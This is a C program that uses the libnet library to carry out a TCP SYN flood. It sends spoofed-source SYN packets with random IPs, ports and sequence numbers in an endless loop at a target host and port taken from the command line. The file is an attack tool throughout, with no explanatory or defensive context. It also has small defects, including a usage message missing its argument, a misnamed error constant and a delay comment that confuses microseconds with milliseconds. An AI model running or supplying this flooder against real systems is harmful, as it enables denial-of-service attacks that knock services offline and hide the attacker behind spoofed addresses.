#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>

#define FLOOD_DELAY 5000    // delay b/w packet injection 5000ms

/*
 * This function returns an
 * IP in dotted notation
 */
char *print_ip( u_long *ip_addr_ptr )
{
    return inet_ntoa(*((struct in_addr *)ip_addr_ptr));
}

int main( int argc, char *argv[] )
{
    u_long   dest_ip;
    u_short  dest_port;
    u_char   errbuf[LIBNET_ERRBUF_SIZE],*packet;
    int      opt,network,byte_count,packet_size = LIBNET_IP_H + LIBNET_TCP_H;

    if ( argc < 3 )
    {
        printf("Usage : %s <targethost> <targetport>");
        exit(1);
    }

    dest_ip   = libnet_name_resolve( argv[1], LIBNET_RESOLVE );    // Resolve host
    dest_port = (u_short)atoi(argv[2]);                       // Target port

    network = libnet_open_raw_sock(IPPROTO_RAW);                   // opening a raw socket
    if ( network == -1 )
        libnet_error(LIBNET_ERR_FATAL,"can't open interface - run as root\n");

    libnet_init_packet(packet_size,&packet);  // Allocate memory for packet
    if ( packet == NULL )
        libnet_error(LIBNET_ERROR_FATAL,"can't initialize packet memory\n");

    libnet_seed_prand();   // Seed randomizer

    printf("SYN flooding %d of %s..\n",dest_port,print_ip(&dest_ip));
    while (1)   // loop forever
    {
        libnet_build_ip(LIBNET_TCP_H,                    // Size of IP header
                        IPTOS_LOWDELAY,                          // IP type of service
                        libnet_get_prand(LIBNET_PRu16),          // IP ID
                        0,                                       // fragmentation
                        libnet_get_prand(LIBNET_PR8),            // TTL (random)
                        IPPROTO_TCP,                             // Protocol
                        libnet_get_prand(LIBNET_PRu32),          // Source IP
                        dest_ip,                                 // destination IP
                        NULL,                                    // Payload (none)
                        0,                                       // Payload length
                        packet);                                 // Packet header memory

        libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // TCP Source port
                         dest_port,                           // Dest port
                         libnet_get_prand(LIBNET_PRu32),      // SEQ #
                         libnet_get_prand(LIBNET_PRu32),      // ACK #
                         TH_SYN,                              // Flag
                         libnet_get_prand(LIBNET_PRu16),      // Window size
                         0,                                   // Urgent pointer
                         NULL,                                // Payload (none)
                         0,                                   // Payload length
                         packet + LIBNET_IP_H);                 // Packet header memory

        if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
            libnet_error(LIBNET_ERR_FATAL, "can't complete checksum\n");

        byte_count = libnet_write_ip(network, packet, packet_size);
        if (byte_count < packet_size)
            libnet_error(LIBNET_ERR_WARNING, "Warning : Incomplete packet written (%d of %d)", byte_count, packet_size);
        usleep(FLOOD_DELAY);
    };

    libnet_destroy_packet(&packet);

    if ( libnet_close_raw_sock(network) == -1 )
        libnet_error(LIBNET_ERR_WARNING,"can't close network interface ");

    return 0;
}
